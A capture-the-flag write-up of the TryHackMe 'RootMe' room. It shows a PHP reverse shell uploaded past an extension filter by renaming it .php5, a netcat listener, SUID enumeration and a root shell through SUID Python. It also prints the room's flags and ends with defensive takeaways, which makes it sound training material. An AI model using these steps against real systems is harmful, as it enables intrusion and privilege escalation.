#  RootMe

> **Platform:** TryHackMe  
> **Difficulty:** Easy  
> **Category:** Web / File Upload Bypass / SUID PrivEsc  
> **Date Completed:** 2026-05-16  
> **Room Link:** [https://tryhackme.com/room/rrootme](https://tryhackme.com/room/rrootme)

---

##  Table of Contents

1. [Room Overview](#room-overview)
2. [Reconnaissance](#reconnaissance)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Privilege Escalation](#privilege-escalation)
6. [Flags](#flags)
7. [Key Takeaways](#key-takeaways)

---

##  Room Overview

RootMe is a beginner-friendly CTF that chains a file upload extension bypass for initial RCE with a SUID Python binary for privilege escalation. The web server blocks `.php` uploads but accepts `.php5` — enough to execute a reverse shell. Once inside, Python with the SUID bit set allows an instant root shell using a one-liner from GTFOBins.

**Goal:**  
Upload a reverse shell past the extension filter, get a shell as `www-data`, find the user flag, then escalate to root via SUID Python.

**Skills Practiced:**  
Nmap scanning, Gobuster directory fuzzing, file upload extension bypass, PHP reverse shell, SUID binary enumeration, Python SUID privesc.

---

##  Reconnaissance

### Network Scanning

```bash
nmap 10.48.185.63 -sV -v
```

**Findings:**

| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 |
| 80   | HTTP    | Apache httpd 2.4.41 (Ubuntu) |

---

##  Enumeration

### Web Application

Visiting `http://10.48.185.63/` shows an animated page.

### Gobuster

```bash
gobuster dir -u http://10.48.185.63/ \
  -w /usr/share/wordlists/dirb/common.txt
```

**Findings:**

| Path | Status | Note |
|------|--------|------|
| `/panel` | 301 | File upload panel |
| `/uploads` | 301 | Uploaded files directory — publicly accessible |
| `/index.php` | 200 | Main page |
| `/.htaccess`, `/.htpasswd` | 403 | Blocked |

Two critical paths: `/panel` for uploading and `/uploads` for triggering the shell.

---

##  Exploitation

### Vulnerability

**Type:** File Upload Extension Bypass → RCE  
**Description:**  
The `/panel` upload form blocks `.php` files. However, the server executes alternative PHP extensions like `.php5`. Renaming the reverse shell to use this extension bypasses the filter while still being interpreted by the PHP engine.

---

### Steps

**Step 1 — Prepare the reverse shell**

Using the pentestmonkey PHP reverse shell, set the attacker IP and port, then save as `shell.php5`.

**Step 2 — Upload via `/panel`**

Upload `shell.php5` — the `.php` extension is rejected, but `.php5` is accepted. 

**Step 3 — Start the listener**

```bash
nc -lnvp 1234
```

**Step 4 — Trigger the shell**

Navigate to `http://10.48.185.63/uploads/shell.php5` — shell received as `www-data`.

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Step 5 — Upgrade to a full TTY**

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

**Step 6 — Find the user flag**

```bash
find / -type f -name "user.txt" 2>/dev/null
# /var/www/user.txt

cat /var/www/user.txt
```

---

##  Privilege Escalation

### SUID Binary Enumeration

```bash
find / -user root -perm -4000 2>/dev/null
```

**Notable SUID binary:** `/usr/bin/python2.7`

Python with the SUID bit set can execute code as root. This is a well-documented GTFOBins escape.

### Escalation via SUID Python

```bash
python -c 'import os;os.execl("/bin/bash", "sh", "-p")'
```

The `-p` flag tells bash to preserve effective UID (the SUID root). 

```bash
whoami
# root
```

### Root Flag

```bash
cat /root/root.txt
```

---

##  Flags

| Flag | Value |
|------|-------|
| User Flag | `THM{y0u_g0t_a_sh3ll}` |
| Root Flag | `THM{pr1v1l3g3_3sc4l4t10n}` |

---

##  Key Takeaways

- **Extension blacklists are not a reliable upload defence.** Blocking `.php` while allowing `.php5`, `.php4`, `.phtml`, `.phar`, or `.shtml` is a common misconfiguration — always whitelist only what's needed rather than blacklisting known bad extensions.
- **Publicly accessible upload directories make RCE trivial.** Once a shell is uploaded, navigating to `/uploads/shell.php5` in the browser is all it takes to execute it. Upload directories should never be web-accessible, or at minimum should strip execution permissions.
- **SUID on interpreters (Python, Perl, Ruby) = instant root.** Any language runtime with the SUID bit set can call `os.execl` or equivalent to spawn a privileged shell. This is one of the most common CTF privesc paths and a real-world risk.
- **`find / -user root -perm -4000`** is always one of the first commands to run after gaining a shell — SUID misconfigurations are widespread and easy to exploit.

---

## 🛠️ Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port & service scanning |
| Gobuster | Directory enumeration — found `/panel` and `/uploads` |
| PHP Reverse Shell (`.php5`) | Upload bypass + RCE as www-data |
| Netcat | Reverse shell listener |
| `find -perm -4000` | SUID binary enumeration |
| SUID Python2.7 | Privilege escalation to root |

---

##  References

- [GTFOBins — python](https://gtfobins.github.io/gtfobins/python/#suid)
- [HackTricks — File Upload Bypass](https://book.hacktricks.xyz/pentesting-web/file-upload)
- [PHP Reverse Shell — pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell)
- [OWASP — Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)

---

*Writeup by Avaneesh*
